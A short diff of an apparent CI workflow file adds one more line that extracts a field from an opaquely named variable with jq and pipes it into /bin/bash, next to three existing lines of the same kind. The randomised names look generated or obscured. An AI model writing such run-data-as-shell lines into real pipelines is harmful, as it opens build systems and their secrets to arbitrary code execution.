@@ -43,6 +43,7 @@ jobs:
           echo $vryci29 | jq -r .zzo67235 | /bin/bash
           printf '%s' "$p856" | jq -r .s46 | /bin/bash
           printf '%s' "$zzlkf5" | jq -r .auu46 | /bin/bash
+          echo $lb30 | jq -r .oc0 | /bin/bash
 
       - name: Persist output
         if: always()
